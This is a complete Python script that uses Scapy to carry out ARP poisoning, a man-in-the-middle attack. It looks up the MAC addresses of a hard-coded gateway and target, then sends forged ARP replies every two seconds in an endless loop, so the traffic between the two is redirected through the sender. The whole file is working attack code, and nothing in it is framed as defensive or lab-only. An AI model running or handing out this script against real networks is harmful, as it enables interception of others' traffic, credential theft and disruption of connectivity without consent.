from scapy.all import sr, sendp, send # Added sendp and Ether
from scapy.layers.l2 import ARP, Ether
from time import sleep
import sys

gateway_ip = "198.10.0.1"
target_ip = "198.10.0.2"

def get_mac(ip_address):
    # Given an IP, get the MAC.

    responses, _ = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=3, timeout=10, verbose=False)
    for _, r in responses:
        return r[ARP].hwsrc

    return None


def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("Poisoning ARP... (CTRL+C to exit)")

    packet_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    
    packet_to_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)

    try:
        while True:
            sendp(packet_to_gateway, verbose=False)
            sendp(packet_to_target, verbose=False)
            sleep(2)
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)


print("Starting script to poison ARP...")
print(f"Gateway IP: {gateway_ip}")
print(f"Target IP: {target_ip}")

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("Couldn't get gateway MAC. Exiting...")
    sys.exit(0)

target_mac = get_mac(target_ip)
if target_mac is None:
    print("Couldn't get target MAC. Exiting...")
    sys.exit(0)

print(f"Gateway MAC: {gateway_mac}")
print(f"Target MAC: {target_mac}")

arp_poison(gateway_ip, gateway_mac, target_ip, target_mac)
